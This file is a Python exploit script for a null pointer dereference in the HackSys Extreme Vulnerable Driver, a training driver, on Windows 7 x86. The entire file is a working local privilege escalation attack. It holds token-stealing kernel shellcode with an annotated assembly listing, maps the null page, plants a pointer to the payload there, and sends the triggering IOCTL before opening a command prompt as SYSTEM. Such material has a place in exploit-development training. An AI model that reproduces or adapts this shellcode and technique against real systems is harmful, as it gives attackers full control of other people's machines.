import struct, sys
from ctypes import *
from subprocess import *

#Function Proxies
kernel32 = windll.kernel32
ntdll = windll.ntdll
NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
WriteProcessMemory = windll.kernel32.WriteProcessMemory
VirtualAlloc = windll.kernel32.VirtualAlloc

#Constants
PAGE_EXECUTE_READWRITE = 0x00000040
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000

def banner():
    logo = """
HEVD - HackSys Exteme Vulnerable Driver
Bug: Null Pointer Dereference
Written By: Eric Van Zutphen
Platform: Windows 7 X86
    """
    return logo

def debug_print(message):
    print(message)

    # void WINAPI OutputDebugString(
    #   _In_opt_ LPCTSTR lpOutputString
    # );

    kernel32.OutputDebugStringA(message + "\n")

def close_handle(handle):
    # BOOL WINAPI CloseHandle(
    #   _In_ HANDLE hObject
    # );

    # close the device handle
    return kernel32.CloseHandle(handle)

def get_device_handle(device):
    open_existing = 0x3
    generic_read = 0x80000000
    generic_write = 0x40000000

    # HANDLE WINAPI CreateFile(
    #   _In_     LPCTSTR               lpFileName,
    #   _In_     DWORD                 dwDesiredAccess,
    #   _In_     DWORD                 dwShareMode,
    #   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    #   _In_     DWORD                 dwCreationDisposition,
    #   _In_     DWORD                 dwFlagsAndAttributes,
    #   _In_opt_ HANDLE                hTemplateFile
    # );

    # get the device handle
    handle = kernel32.CreateFileA(device,
                                  generic_read | generic_write,
                                  None,
                                  None,
                                  open_existing,
                                  None,
                                  None)

    if not handle:
        debug_print("\t[-] Unable to get device handle")
        sys.exit(-1)
    return handle

def send_ioctl_code(ioctl_code,inbuf):
    global device_handle
    bytes_returned = c_ulong()
    inputbuffer = inbuf
    ioctl = ioctl_code
    device_name = "\\\\.\\HackSysExtremeVulnerableDriver"
    device_handle = get_device_handle(device_name)
    success = kernel32.DeviceIoControl(device_handle,ioctl,inputbuffer,0x4,None,0,byref(bytes_returned),None)
    if not close_handle(device_handle):
        debug_print("\t[-] Unable to close device handle")


def write_shellcode():
    global shellcode
    global ptr
    #System Token Stealing Payload
    print "[+] Writing Stealing SYSTEM Token To Memory"
    shellcode = bytearray(
        "\x90\x90\x90\x90"            # Nop Sled
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]         |Offset to _EProcess
        "\x89\xc1"                        # mov ecx,eax                |Copy _EProcess into ecx
        "\xba\x04\x00\x00\x00"            # mov edx,0x4                |SYSTEM PID Always 4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]         |Search for SYSTEM Process
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8 
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx         |Compare if PID == 4
        "\x75\xed"                        # jnz 0x1a                   |Jump Back to Search Function if PID != 4
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]         |Copy SYSTEM Token into EDX
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx         |Overwrite with System Token
        "\x61"                            # popad
        "\xc3"							  # retn
        )                            
    #---------------------------------------------------------[Structure]-#
    # LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
    #   _In_opt_  LPVOID lpAddress,       => None                         #
    #   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
    #   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
    #   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
    # );                                                                  #
    #---------------------------------------------------------------------#
    ptr = VirtualAlloc(None,len(shellcode),(MEM_COMMIT|MEM_RESERVE),PAGE_EXECUTE_READWRITE)   
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))

def allocate_virtual_memory():
	baseadd = c_ulong(0x1)
	size = c_ulong(0x100)
	dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0x0, byref(size), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)
	if dwStatus != 0x0:
		print "\t[-]Something went wrong while allocating memory"
		sys.exit()

def write_process_memory(pointer, payload):
	print "[+] Ring0 pointer located at memory address: {0} ".format(hex(pointer))
	written = c_ulong()
	dwStatus = WriteProcessMemory(0xFFFFFFFF, 0x4, byref(c_void_p(pointer)), len(payload), byref(written))
	if dwStatus == 0:
		print "\t[-]Something went wrong while writing to process memory"
		sys.exit()

if __name__ == '__main__':
    banner()
    write_shellcode()
    allocate_virtual_memory()
    write_process_memory(ptr, shellcode)
    ioctl = 0x22202b
    exploit = "\x90\x13\x66\xB1"
    send_ioctl_code(ioctl, exploit)
    Popen("start cmd", shell=True)
    debug_print("[+] Null Pointer Dereference Complete")
    debug_print("[+] Check Privileges...")   
